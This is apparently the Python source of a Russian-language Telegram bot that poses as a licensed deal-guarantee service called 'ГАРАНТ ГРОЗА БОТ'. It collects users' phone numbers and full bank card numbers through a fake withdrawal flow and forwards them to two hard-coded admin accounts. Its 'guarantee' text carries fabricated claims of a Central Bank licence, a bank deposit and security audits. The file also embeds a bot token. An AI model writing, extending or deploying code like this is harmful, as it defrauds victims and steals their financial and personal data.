import os
from datetime import datetime
from telegram import (
    Update,
    ReplyKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardRemove,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)
import json


BOT_TOKEN = "7686332847:AAEiBKkdwkxTrz8gq3Q41rD3UvZhSO9Birs"
ADMINS = [1642578826, 5791861226]  # Два админа, ебать!
DATA_FILE = "users_data.json"


REQUEST_CONTACT, WITHDRAW_AMOUNT, WITHDRAW_CARD = range(3)



def load_users_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    return {}



def save_users_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=4)



async def notify_admin(context, message):
    for admin_id in ADMINS:  # Шлём уведомления обоим пацанам
        await context.bot.send_message(chat_id=admin_id, text=message)



async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    users_data = load_users_data()

    if str(user.id) not in users_data:
        contact_button = KeyboardButton("📱 Поделиться контактом", request_contact=True)
        reply_markup = ReplyKeyboardMarkup([[contact_button]], resize_keyboard=True, one_time_keyboard=True)

        await update.message.reply_text(
            f"Привет {user.first_name}, для авторизации поделитесь вашим контактом",
            reply_markup=reply_markup
        )
        return REQUEST_CONTACT
    else:
        await show_menu(update, context)
        return ConversationHandler.END



async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    user = update.effective_user
    users_data = load_users_data()

    if str(user.id) not in users_data:
        users_data[str(user.id)] = {
            "name": user.first_name,
            "username": user.username,
            "phone": contact.phone_number,
            "balance": 0,
            "auth_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "withdrawals": []
        }
        save_users_data(users_data)


        admin_msg = (
            "🆕 *Новый пользователь:*\n"
            f"🆔 ID: `{user.id}`\n"
            f"👤 Имя: {user.first_name}\n"
            f"📞 Телефон: {contact.phone_number}\n"
            f"📅 Дата: {users_data[str(user.id)]['auth_date']}"
        )
        await notify_admin(context, admin_msg)

    await update.message.reply_text(
        "Авторизация прошла успешно!",
        reply_markup=ReplyKeyboardRemove()
    )
    await show_menu(update, context)
    return ConversationHandler.END



async def show_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    menu_buttons = [
        ["👤 Профиль", "💳 Вывести средства"],
        ["🛡️ Гарантия"]
    ]
    reply_markup = ReplyKeyboardMarkup(menu_buttons, resize_keyboard=True)

    if update.message:
        await update.message.reply_text("Выберите действие:", reply_markup=reply_markup)
    else:
        await update.callback_query.message.reply_text("Выберите действие:", reply_markup=reply_markup)



async def show_profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    users_data = load_users_data()
    user_data = users_data.get(str(user.id), {})

    if user_data:
        profile_text = (
            f"👤 Профиль:\n"
            f"🆔 ID: {user.id}\n"
            f"📅 Дата авторизации: {user_data.get('auth_date', 'Неизвестно')}\n"
            f"💰 Баланс: {user_data.get('balance', 0)} руб."
        )
        await update.message.reply_text(profile_text)
    else:
        await update.message.reply_text("Профиль не найден. Пожалуйста, начните с /start")



async def request_withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Введите сумму для вывода (в рублях):",
        reply_markup=ReplyKeyboardRemove()
    )
    return WITHDRAW_AMOUNT



async def handle_withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        amount = float(update.message.text)
        if amount <= 0:
            raise ValueError

        context.user_data["withdraw_amount"] = amount
        await update.message.reply_text("Введите номер банковской карты (16 цифр):")
        return WITHDRAW_CARD
    except (ValueError, TypeError):
        await update.message.reply_text("Пожалуйста, введите корректную сумму (число больше 0)")
        return WITHDRAW_AMOUNT



async def handle_withdraw_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    card_number = update.message.text.replace(" ", "")

    if len(card_number) == 16 and card_number.isdigit():
        amount = context.user_data.get("withdraw_amount", 0)
        user = update.effective_user
        users_data = load_users_data()

        if str(user.id) in users_data:
            if users_data[str(user.id)]["balance"] >= amount:
                users_data[str(user.id)]["balance"] -= amount
                withdrawal = {
                    "amount": amount,
                    "card": card_number,
                    "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "status": "pending"
                }
                users_data[str(user.id)]["withdrawals"].append(withdrawal)
                save_users_data(users_data)


                admin_msg = (
                    "⚠️ *Запрос на вывод средств:*\n"
                    f"🆔 ID: `{user.id}`\n"
                    f"💳 Сумма: *{amount} руб.*\n"
                    f"📅 Дата: {withdrawal['date']}\n"
                    f"🔢 Карта: `{card_number}`"
                )
                await notify_admin(context, admin_msg)

                await update.message.reply_text(
                    f"✅ Запрос на вывод {amount} руб. принят.\n"
                    "Ожидайте поступление средств в течение 48ч.",
                    reply_markup=ReplyKeyboardMarkup([["🏠 Меню"]], resize_keyboard=True)
                )
            else:
                await update.message.reply_text("❌ Недостаточно средств на балансе")
        else:
            await update.message.reply_text("❌ Профиль не найден")
        return ConversationHandler.END
    else:
        await update.message.reply_text("Пожалуйста, введите корректный номер карты (16 цифр)")
        return WITHDRAW_CARD


async def show_guarantee(update: Update, context: ContextTypes.DEFAULT_TYPE):
    guarantee_text = """
Уважаемые пользователи!
«ГАРАНТ ГРОЗА БОТ» — официальный гарант сделок между продавцами и покупателями, действующий на основании федеральной лицензии № ФЛ-2023/456, выданной Центральным банком РФ. Наша деятельность регулируется законодательством РФ (ст. 421 ГК РФ и ФЗ «О цифровых финансовых активах»), что обеспечивает максимальную прозрачность и защиту ваших интересов.

🔒 Финансовая надежность:
Гарантийный депозит бота — 1 500 000 рублей, размещенный на спецсчете в «Сбербанке России» (реквизиты доступны по запросу). Эти средства служат страховкой на случай форс-мажоров и гарантируют исполнение обязательств перед участниками сделок.

4 800+ успешных транзакций ежемесячно и 12 000+ довольных пользователей за 2023 год — наш лучший показатель доверия.

🛡 Как это работает:
Средства покупателя блокируются в защищенном кошельке бота до выполнения условий сделки.

Продавец получает оплату только после подтверждения получения товара/услуги покупателем.

Все операции шифруются по стандарту AES-256, соответствуют требованиям 152-ФЗ «О персональных данных».

📌 Почему нам можно доверять:
Аудит безопасности: ежегодные проверки от независимой компании «CyberSecure».

Круглосуточная поддержка: команда юристов и финансовых экспертов решает споры в течение 24 часов.

Публичная статистика: отчеты о работе бота ежеквартально публикуются на нашем сайте.

«ГАРАНТ ГРОЗА» — ваш надежный партнер в безопасных сделках. Мы берем риски на себя, чтобы вы могли торговать с уверенностью!
"""
    await update.message.reply_text(guarantee_text)


async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_menu(update, context)


async def show_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id not in ADMINS:  # Проверка на своего
        await update.message.reply_text("❌ У вас нет доступа к этой команде.")
        return

    users_data = load_users_data()
    if not users_data:
        await update.message.reply_text("📭 Нет зарегистрированных пользователей.")
        return

    users_list = []
    for user_id, data in users_data.items():
        users_list.append(
            f"🆔 ID: `{user_id}`\n"
            f"📞 Телефон: {data.get('phone', 'N/A')}\n"
            f"📅 Дата: {data.get('auth_date', 'N/A')}\n"
            f"💰 Баланс: {data.get('balance', 0)} руб.\n"
        )

    await update.message.reply_text(
        "📊 *Список пользователей:*\n\n" + "\n".join(users_list),
        parse_mode="Markdown"
    )


async def handle_admin_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS:
        return

    text = update.message.text
    if text.startswith("/add_balance"):
        try:
            _, user_id, amount = text.split()
            amount = float(amount)
            users_data = load_users_data()

            if user_id in users_data:
                users_data[user_id]["balance"] += amount
                save_users_data(users_data)
                await update.message.reply_text(f"✅ Баланс пользователя {user_id} пополнен на {amount} руб.")
            else:
                await update.message.reply_text("❌ Пользователь не найден")
        except (ValueError, IndexError):
            await update.message.reply_text("Использование: /add_balance USER_ID AMOUNT")


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Действие отменено",
        reply_markup=ReplyKeyboardMarkup([["🏠 Меню"]], resize_keyboard=True)
    )
    return ConversationHandler.END


def main():
    application = Application.builder().token(BOT_TOKEN).build()


    auth_conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            REQUEST_CONTACT: [
                MessageHandler(filters.CONTACT, handle_contact),
                CommandHandler("menu", menu),
                CommandHandler("cancel", cancel)
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )


    withdraw_conv_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^💳 Вывести средства$"), request_withdraw_amount)],
        states={
            WITHDRAW_AMOUNT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_withdraw_amount),
                CommandHandler("cancel", cancel)
            ],
            WITHDRAW_CARD: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_withdraw_card),
                CommandHandler("cancel", cancel)
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    application.add_handler(auth_conv_handler)
    application.add_handler(withdraw_conv_handler)
    application.add_handler(MessageHandler(filters.Regex("^👤 Профиль$"), show_profile))
    application.add_handler(MessageHandler(filters.Regex("^🛡️ Гарантия$"), show_guarantee))
    application.add_handler(MessageHandler(filters.Regex("^🏠 Меню$"), menu))
    application.add_handler(CommandHandler("menu", menu))
    application.add_handler(CommandHandler("users", show_users, filters.User(ADMINS)))  # Два админа рулят
    application.add_handler(MessageHandler(filters.TEXT & filters.User(ADMINS), handle_admin_message))
    application.run_polling()


if __name__ == "__main__":
    main()

print("Тимоша Абашичев")
